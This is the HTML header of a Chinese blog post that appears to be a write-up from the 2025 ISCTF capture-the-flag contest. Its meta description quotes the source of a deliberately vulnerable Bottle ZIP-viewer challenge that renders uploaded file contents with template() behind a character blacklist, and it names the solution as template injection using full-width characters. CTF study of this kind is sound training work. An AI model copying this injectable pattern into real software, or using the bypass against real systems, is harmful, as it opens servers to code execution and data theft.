@@ -1,0 +1,1898 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 难过的bottle 考点：ssti之全角字符绕过 看看源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 from bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time import shutil # hint: flag is in /flag UPLOAD_DIR = &#39;uploads&#39; os.makedirs(UPLOAD_DIR, exist_ok=True) MAX_FILE_SIZE = 1 * 1024 * 1024 # 1MB BLACKLIST = [&#34;b&#34;,&#34;c&#34;,&#34;d&#34;,&#34;e&#34;,&#34;h&#34;,&#34;i&#34;,&#34;j&#34;,&#34;k&#34;,&#34;m&#34;,&#34;n&#34;,&#34;o&#34;,&#34;p&#34;,&#34;q&#34;,&#34;r&#34;,&#34;s&#34;,&#34;t&#34;,&#34;u&#34;,&#34;v&#34;,&#34;w&#34;,&#34;x&#34;,&#34;y&#34;,&#34;z&#34;,&#34;%&#34;,&#34;;&#34;,&#34;,&#34;,&#34;&lt;&#34;,&#34;&gt;&#34;,&#34;:&#34;,&#34;?&#34;] def contains_blacklist(content): &#34;&#34;&#34;检查内容是否包含黑名单中的关键词（不区分大小写）&#34;&#34;&#34; content = content.lower() return any(black_word in content for black_word in BLACKLIST) def safe_extract_zip(zip_path, extract_dir): &#34;&#34;&#34;安全解压ZIP文件（防止路径遍历攻击）&#34;&#34;&#34; with zipfile.ZipFile(zip_path, &#39;r&#39;) as zf: for member in zf.infolist(): member_path = os.path.realpath(os.path.join(extract_dir, member.filename)) if not member_path.startswith(os.path.realpath(extract_dir)): raise ValueError(&#34;非法文件路径: 路径遍历攻击检测&#34;) zf.extract(member, extract_dir) @route(&#39;/&#39;) def index(): &#34;&#34;&#34;首页&#34;&#34;&#34; return &#39;&#39;&#39; &lt;!DOCTYPE html&gt; &lt;html lang=&#34;zh-CN&#34;&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; &lt;title&gt;ZIP文件查看器&lt;/title&gt; &lt;link href=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt; &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&#34;header text-center&#34;&gt; &lt;div class=&#34;container&#34;&gt; &lt;h1 class=&#34;display-4 fw-bold&#34;&gt;📦 ZIP文件查看器&lt;/h1&gt; &lt;p class=&#34;lead&#34;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;container&#34;&gt; &lt;div class=&#34;row justify-content-center&#34; id=&#34;index-page&#34;&gt; &lt;div class=&#34;col-md-8 text-center&#34;&gt; &lt;div class=&#34;card&#34;&gt; &lt;div class=&#34;card-body p-5&#34;&gt; &lt;div class=&#34;emoji-icon&#34;&gt;📤&lt;/div&gt; &lt;h2 class=&#34;card-title&#34;&gt;轻松查看ZIP文件内容&lt;/h2&gt; &lt;p class=&#34;card-text&#34;&gt;上传ZIP文件并安全地查看其中的内容，无需解压到本地设备&lt;/p&gt; &lt;div class=&#34;mt-4&#34;&gt; &lt;a href=&#34;/upload&#34; class=&#34;btn btn-primary btn-lg px-4 me-3&#34;&gt; 📁 上传ZIP文件 &lt;/a&gt; &lt;a href=&#34;#features&#34; class=&#34;btn btn-outline-secondary btn-lg px-4&#34;&gt; ℹ️ 了解更多 &lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;row mt-5&#34; id=&#34;features&#34;&gt; &lt;div class=&#34;col-md-4 mb-4&#34;&gt; &lt;div class=&#34;card h-100&#34;&gt; &lt;div class=&#34;card-body text-center p-4&#34;&gt; &lt;div class=&#34;emoji-icon&#34;&gt;🛡️&lt;/div&gt; &lt;h4&gt;安全检测&lt;/h4&gt; &lt;p&gt;系统会自动检测上传文件，防止路径遍历攻击和恶意内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;col-md-4 mb-4&#34;&gt; &lt;div class=&#34;card h-100&#34;&gt; &lt;div class=&#34;card-body text-center p-4&#34;&gt; &lt;div class=&#34;emoji-icon&#34;&gt;📄&lt;/div&gt; &lt;h4&gt;内容预览&lt;/h4&gt; &lt;p&gt;直接在线查看ZIP文件中的文本内容，无需下载&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;col-md-4 mb-4&#34;&gt; &lt;div class=&#34;card h-100&#34;&gt; &lt;div class=&#34;card-body text-center p-4&#34;&gt; &lt;div class=&#34;emoji-icon&#34;&gt;⚡&lt;/div&gt; &lt;h4&gt;快速处理&lt;/h4&gt; &lt;p&gt;高效处理小于1MB的ZIP文件，快速获取内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &#39;&#39;&#39; @route(&#39;/upload&#39;) def upload_page(): &#34;&#34;&#34;上传页面&#34;&#34;&#34; return &#39;&#39;&#39; &lt;!DOCTYPE html&gt; &lt;html lang=&#34;zh-CN&#34;&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; &lt;title&gt;上传ZIP文件&lt;/title&gt; &lt;link href=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt; &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&#34;header text-center&#34;&gt; &lt;div class=&#34;container&#34;&gt; &lt;h1 class=&#34;display-4 fw-bold&#34;&gt;📦 ZIP文件查看器&lt;/h1&gt; &lt;p class=&#34;lead&#34;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;container mt-4&#34;&gt; &lt;div class=&#34;row justify-content-center&#34;&gt; &lt;div class=&#34;col-md-8&#34;&gt; &lt;div class=&#34;card&#34;&gt; &lt;div class=&#34;card-header bg-primary text-white&#34;&gt; &lt;h4 class=&#34;mb-0&#34;&gt;📤 上传ZIP文件&lt;/h4&gt; &lt;/div&gt; &lt;div class=&#34;card-body&#34;&gt; &lt;form action=&#34;/upload&#34; method=&#34;post&#34; enctype=&#34;multipart/form-data&#34; class=&#34;upload-form&#34;&gt; &lt;div class=&#34;mb-3&#34;&gt; &lt;label for=&#34;fileInput&#34; class=&#34;form-label&#34;&gt;选择ZIP文件（最大1MB）&lt;/label&gt; &lt;input class=&#34;form-control&#34; type=&#34;file&#34; name=&#34;file&#34; id=&#34;fileInput&#34; accept=&#34;.zip&#34; required&gt; &lt;div class=&#34;form-text&#34;&gt;仅支持.zip格式的文件，且文件大小不超过1MB&lt;/div&gt; &lt;/div&gt; &lt;button type=&#34;submit&#34; class=&#34;btn btn-primary w-100&#34;&gt; 📤 上传文件 &lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;text-center mt-4&#34;&gt; &lt;a href=&#34;/&#34; class=&#34;btn btn-outline-secondary&#34;&gt; ↩️ 返回首页 &lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &#39;&#39;&#39; @post(&#39;/upload&#39;) def upload(): &#34;&#34;&#34;处理文件上传&#34;&#34;&#34; zip_file = request.files.get(&#39;file&#39;) if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;请上传有效的ZIP文件&#39; zip_file.file.seek(0, 2) file_size = zip_file.file.tell() zip_file.file.seek(0) if file_size &gt; MAX_FILE_SIZE: return f&#39;文件大小超过限制({MAX_FILE_SIZE/1024/1024}MB)&#39; timestamp = str(time.time()) unique_str = zip_file.filename + timestamp dir_hash = hashlib.md5(unique_str.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, dir_hash) os.makedirs(extract_dir, exist_ok=True) zip_path = os.path.join(extract_dir, &#39;uploaded.zip&#39;) zip_file.save(zip_path) try: safe_extract_zip(zip_path, extract_dir) except (zipfile.BadZipFile, ValueError) as e: shutil.rmtree(extract_dir) return f&#39;处理ZIP文件时出错: {str(e)}&#39; files = [f for f in os.listdir(extract_dir) if f != &#39;uploaded.zip&#39;] return template(&#39;&#39;&#39; &lt;!DOCTYPE html&gt; &lt;html lang=&#34;zh-CN&#34;&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; &lt;title&gt;上传成功&lt;/title&gt; &lt;link href=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt; &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&#34;header text-center&#34;&gt; &lt;div class=&#34;container&#34;&gt; &lt;h1 class=&#34;display-4 fw-bold&#34;&gt;📦 ZIP文件查看器&lt;/h1&gt; &lt;p class=&#34;lead&#34;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;container mt-4&#34;&gt; &lt;div class=&#34;row justify-content-center&#34;&gt; &lt;div class=&#34;col-md-8&#34;&gt; &lt;div class=&#34;card&#34;&gt; &lt;div class=&#34;card-header bg-success text-white&#34;&gt; &lt;h4 class=&#34;mb-0&#34;&gt;✅ 上传成功!&lt;/h4&gt; &lt;/div&gt; &lt;div class=&#34;card-body&#34;&gt; &lt;div class=&#34;alert alert-success&#34; role=&#34;alert&#34;&gt; ✅ 文件已成功上传并解压 &lt;/div&gt; &lt;h5&gt;文件列表:&lt;/h5&gt; &lt;ul class=&#34;list-group mb-4&#34;&gt; % for file in files: &lt;li class=&#34;list-group-item d-flex justify-content-between align-items-center&#34;&gt; &lt;span&gt;📄 {{file}}&lt;/span&gt; &lt;a href=&#34;/view/{{dir_hash}}/{{file}}&#34; class=&#34;btn btn-sm btn-outline-primary&#34;&gt; 查看 &lt;/a&gt; &lt;/li&gt; % end &lt;/ul&gt; % if files: &lt;div class=&#34;d-grid gap-2&#34;&gt; &lt;a href=&#34;/view/{{dir_hash}}/{{files[0]}}&#34; class=&#34;btn btn-primary&#34;&gt; 👀 查看第一个文件 &lt;/a&gt; &lt;/div&gt; % end &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;text-center mt-4&#34;&gt; &lt;a href=&#34;/upload&#34; class=&#34;btn btn-outline-primary me-2&#34;&gt; ➕ 上传另一个文件 &lt;/a&gt; &lt;a href=&#34;/&#34; class=&#34;btn btn-outline-secondary&#34;&gt; 🏠 返回首页 &lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &#39;&#39;&#39;, dir_hash=dir_hash, files=files) @route(&#39;/view/&lt;dir_hash&gt;/&lt;filename:path&gt;&#39;) def view_file(dir_hash, filename): file_path = os.path.join(UPLOAD_DIR, dir_hash, filename) if not os.path.exists(file_path): return &#34;文件不存在&#34; if not os.path.isfile(file_path): return &#34;请求的路径不是文件&#34; real_path = os.path.realpath(file_path) if not real_path.startswith(os.path.realpath(UPLOAD_DIR)): return &#34;非法访问尝试&#34; try: with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() except: try: with open(file_path, &#39;r&#39;, encoding=&#39;latin-1&#39;) as f: content = f.read() except: return &#34;无法读取文件内容（可能是二进制文件）&#34; if contains_blacklist(content): return &#34;文件内容包含不允许的关键词&#34; try: return template(content) except Exception as e: return f&#34;渲染错误: {str(e)}&#34; @route(&#39;/static/&lt;filename:path&gt;&#39;) def serve_static(filename): &#34;&#34;&#34;静态文件服务&#34;&#34;&#34; return static_file(filename, root=&#39;static&#39;) @error(404) def error404(error): return &#34;讨厌啦不是说好只看看不摸的吗&#34; @error(500) def error500(error): return &#34;不要透进来啊啊啊啊&#34; if __name__ == &#39;__main__&#39;: os.makedirs(&#39;static&#39;, exist_ok=True) #原神，启动! run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) 一开始以为软链接，后面一看，不就是打ssti嘛，直接打全角字符绕过\n">
+<title>2025isctf</title>
+
+<link rel='canonical' href='https://luo-kaihong.github.io/p/2025isctf/'>
+
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2025isctf">
+<meta property='og:description' content=" 难过的bottle 考点：ssti之全角字符绕过 看看源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 from bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time import shutil # hint: flag is in /flag UPLOAD_DIR = &#39;uploads&#39; os.makedirs(UPLOAD_DIR, exist_ok=True) MAX_FILE_SIZE = 1 * 1024 * 1024 # 1MB BLACKLIST = [&#34;b&#34;,&#34;c&#34;,&#34;d&#34;,&#34;e&#34;,&#34;h&#34;,&#34;i&#34;,&#34;j&#34;,&#34;k&#34;,&#34;m&#34;,&#34;n&#34;,&#34;o&#34;,&#34;p&#34;,&#34;q&#34;,&#34;r&#34;,&#34;s&#34;,&#34;t&#34;,&#34;u&#34;,&#34;v&#34;,&#34;w&#34;,&#34;x&#34;,&#34;y&#34;,&#34;z&#34;,&#34;%&#34;,&#34;;&#34;,&#34;,&#34;,&#34;&lt;&#34;,&#34;&gt;&#34;,&#34;:&#34;,&#34;?&#34;] def contains_blacklist(content): &#34;&#34;&#34;检查内容是否包含黑名单中的关键词（不区分大小写）&#34;&#34;&#34; content = content.lower() return any(black_word in content for black_word in BLACKLIST) def safe_extract_zip(zip_path, extract_dir): &#34;&#34;&#34;安全解压ZIP文件（防止路径遍历攻击）&#34;&#34;&#34; with zipfile.ZipFile(zip_path, &#39;r&#39;) as zf: for member in zf.infolist(): member_path = os.path.realpath(os.path.join(extract_dir, member.filename)) if not member_path.startswith(os.path.realpath(extract_dir)): raise ValueError(&#34;非法文件路径: 路径遍历攻击检测&#34;) zf.extract(member, extract_dir) @route(&#39;/&#39;) def index(): &#34;&#34;&#34;首页&#34;&#34;&#34; return &#39;&#39;&#39; &lt;!DOCTYPE html&gt; &lt;html lang=&#34;zh-CN&#34;&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; &lt;title&gt;ZIP文件查看器&lt;/title&gt; &lt;link href=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt; &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&#34;header text-center&#34;&gt; &lt;div class=&#34;container&#34;&gt; &lt;h1 class=&#34;display-4 fw-bold&#34;&gt;📦 ZIP文件查看器&lt;/h1&gt; &lt;p class=&#34;lead&#34;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;container&#34;&gt; &lt;div class=&#34;row justify-content-center&#34; id=&#34;index-page&#34;&gt; &lt;div class=&#34;col-md-8 text-center&#34;&gt; &lt;div class=&#34;card&#34;&gt; &lt;div class=&#34;card-body p-5&#34;&gt; &lt;div class=&#34;emoji-icon&#34;&gt;📤&lt;/div&gt; &lt;h2 class=&#34;card-title&#34;&gt;轻松查看ZIP文件内容&lt;/h2&gt; &lt;p class=&#34;card-text&#34;&gt;上传ZIP文件并安全地查看其中的内容，无需解压到本地设备&lt;/p&gt; &lt;div class=&#34;mt-4&#34;&gt; &lt;a href=&#34;/upload&#34; class=&#34;btn btn-primary btn-lg px-4 me-3&#34;&gt; 📁 上传ZIP文件 &lt;/a&gt; &lt;a href=&#34;#features&#34; class=&#34;btn btn-outline-secondary btn-lg px-4&#34;&gt; ℹ️ 了解更多 &lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;row mt-5&#34; id=&#34;features&#34;&gt; &lt;div class=&#34;col-md-4 mb-4&#34;&gt; &lt;div class=&#34;card h-100&#34;&gt; &lt;div class=&#34;card-body text-center p-4&#34;&gt; &lt;div class=&#34;emoji-icon&#34;&gt;🛡️&lt;/div&gt; &lt;h4&gt;安全检测&lt;/h4&gt; &lt;p&gt;系统会自动检测上传文件，防止路径遍历攻击和恶意内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;col-md-4 mb-4&#34;&gt; &lt;div class=&#34;card h-100&#34;&gt; &lt;div class=&#34;card-body text-center p-4&#34;&gt; &lt;div class=&#34;emoji-icon&#34;&gt;📄&lt;/div&gt; &lt;h4&gt;内容预览&lt;/h4&gt; &lt;p&gt;直接在线查看ZIP文件中的文本内容，无需下载&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;col-md-4 mb-4&#34;&gt; &lt;div class=&#34;card h-100&#34;&gt; &lt;div class=&#34;card-body text-center p-4&#34;&gt; &lt;div class=&#34;emoji-icon&#34;&gt;⚡&lt;/div&gt; &lt;h4&gt;快速处理&lt;/h4&gt; &lt;p&gt;高效处理小于1MB的ZIP文件，快速获取内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &#39;&#39;&#39; @route(&#39;/upload&#39;) def upload_page(): &#34;&#34;&#34;上传页面&#34;&#34;&#34; return &#39;&#39;&#39; &lt;!DOCTYPE html&gt; &lt;html lang=&#34;zh-CN&#34;&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; &lt;title&gt;上传ZIP文件&lt;/title&gt; &lt;link href=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt; &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&#34;header text-center&#34;&gt; &lt;div class=&#34;container&#34;&gt; &lt;h1 class=&#34;display-4 fw-bold&#34;&gt;📦 ZIP文件查看器&lt;/h1&gt; &lt;p class=&#34;lead&#34;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;container mt-4&#34;&gt; &lt;div class=&#34;row justify-content-center&#34;&gt; &lt;div class=&#34;col-md-8&#34;&gt; &lt;div class=&#34;card&#34;&gt; &lt;div class=&#34;card-header bg-primary text-white&#34;&gt; &lt;h4 class=&#34;mb-0&#34;&gt;📤 上传ZIP文件&lt;/h4&gt; &lt;/div&gt; &lt;div class=&#34;card-body&#34;&gt; &lt;form action=&#34;/upload&#34; method=&#34;post&#34; enctype=&#34;multipart/form-data&#34; class=&#34;upload-form&#34;&gt; &lt;div class=&#34;mb-3&#34;&gt; &lt;label for=&#34;fileInput&#34; class=&#34;form-label&#34;&gt;选择ZIP文件（最大1MB）&lt;/label&gt; &lt;input class=&#34;form-control&#34; type=&#34;file&#34; name=&#34;file&#34; id=&#34;fileInput&#34; accept=&#34;.zip&#34; required&gt; &lt;div class=&#34;form-text&#34;&gt;仅支持.zip格式的文件，且文件大小不超过1MB&lt;/div&gt; &lt;/div&gt; &lt;button type=&#34;submit&#34; class=&#34;btn btn-primary w-100&#34;&gt; 📤 上传文件 &lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;text-center mt-4&#34;&gt; &lt;a href=&#34;/&#34; class=&#34;btn btn-outline-secondary&#34;&gt; ↩️ 返回首页 &lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &#39;&#39;&#39; @post(&#39;/upload&#39;) def upload(): &#34;&#34;&#34;处理文件上传&#34;&#34;&#34; zip_file = request.files.get(&#39;file&#39;) if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;请上传有效的ZIP文件&#39; zip_file.file.seek(0, 2) file_size = zip_file.file.tell() zip_file.file.seek(0) if file_size &gt; MAX_FILE_SIZE: return f&#39;文件大小超过限制({MAX_FILE_SIZE/1024/1024}MB)&#39; timestamp = str(time.time()) unique_str = zip_file.filename + timestamp dir_hash = hashlib.md5(unique_str.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, dir_hash) os.makedirs(extract_dir, exist_ok=True) zip_path = os.path.join(extract_dir, &#39;uploaded.zip&#39;) zip_file.save(zip_path) try: safe_extract_zip(zip_path, extract_dir) except (zipfile.BadZipFile, ValueError) as e: shutil.rmtree(extract_dir) return f&#39;处理ZIP文件时出错: {str(e)}&#39; files = [f for f in os.listdir(extract_dir) if f != &#39;uploaded.zip&#39;] return template(&#39;&#39;&#39; &lt;!DOCTYPE html&gt; &lt;html lang=&#34;zh-CN&#34;&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; &lt;title&gt;上传成功&lt;/title&gt; &lt;link href=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt; &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&#34;header text-center&#34;&gt; &lt;div class=&#34;container&#34;&gt; &lt;h1 class=&#34;display-4 fw-bold&#34;&gt;📦 ZIP文件查看器&lt;/h1&gt; &lt;p class=&#34;lead&#34;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;container mt-4&#34;&gt; &lt;div class=&#34;row justify-content-center&#34;&gt; &lt;div class=&#34;col-md-8&#34;&gt; &lt;div class=&#34;card&#34;&gt; &lt;div class=&#34;card-header bg-success text-white&#34;&gt; &lt;h4 class=&#34;mb-0&#34;&gt;✅ 上传成功!&lt;/h4&gt; &lt;/div&gt; &lt;div class=&#34;card-body&#34;&gt; &lt;div class=&#34;alert alert-success&#34; role=&#34;alert&#34;&gt; ✅ 文件已成功上传并解压 &lt;/div&gt; &lt;h5&gt;文件列表:&lt;/h5&gt; &lt;ul class=&#34;list-group mb-4&#34;&gt; % for file in files: &lt;li class=&#34;list-group-item d-flex justify-content-between align-items-center&#34;&gt; &lt;span&gt;📄 {{file}}&lt;/span&gt; &lt;a href=&#34;/view/{{dir_hash}}/{{file}}&#34; class=&#34;btn btn-sm btn-outline-primary&#34;&gt; 查看 &lt;/a&gt; &lt;/li&gt; % end &lt;/ul&gt; % if files: &lt;div class=&#34;d-grid gap-2&#34;&gt; &lt;a href=&#34;/view/{{dir_hash}}/{{files[0]}}&#34; class=&#34;btn btn-primary&#34;&gt; 👀 查看第一个文件 &lt;/a&gt; &lt;/div&gt; % end &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;text-center mt-4&#34;&gt; &lt;a href=&#34;/upload&#34; class=&#34;btn btn-outline-primary me-2&#34;&gt; ➕ 上传另一个文件 &lt;/a&gt; &lt;a href=&#34;/&#34; class=&#34;btn btn-outline-secondary&#34;&gt; 🏠 返回首页 &lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &#39;&#39;&#39;, dir_hash=dir_hash, files=files) @route(&#39;/view/&lt;dir_hash&gt;/&lt;filename:path&gt;&#39;) def view_file(dir_hash, filename): file_path = os.path.join(UPLOAD_DIR, dir_hash, filename) if not os.path.exists(file_path): return &#34;文件不存在&#34; if not os.path.isfile(file_path): return &#34;请求的路径不是文件&#34; real_path = os.path.realpath(file_path) if not real_path.startswith(os.path.realpath(UPLOAD_DIR)): return &#34;非法访问尝试&#34; try: with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() except: try: with open(file_path, &#39;r&#39;, encoding=&#39;latin-1&#39;) as f: content = f.read() except: return &#34;无法读取文件内容（可能是二进制文件）&#34; if contains_blacklist(content): return &#34;文件内容包含不允许的关键词&#34; try: return template(content) except Exception as e: return f&#34;渲染错误: {str(e)}&#34; @route(&#39;/static/&lt;filename:path&gt;&#39;) def serve_static(filename): &#34;&#34;&#34;静态文件服务&#34;&#34;&#34; return static_file(filename, root=&#39;static&#39;) @error(404) def error404(error): return &#34;讨厌啦不是说好只看看不摸的吗&#34; @error(500) def error500(error): return &#34;不要透进来啊啊啊啊&#34; if __name__ == &#39;__main__&#39;: os.makedirs(&#39;static&#39;, exist_ok=True) #原神，启动! run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) 一开始以为软链接，后面一看，不就是打ssti嘛，直接打全角字符绕过\n">
+<meta property='og:url' content='https://luo-kaihong.github.io/p/2025isctf/'>
+<meta property='og:site_name' content='罗铠鸿'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-12-01T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-12-01T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="2025isctf">
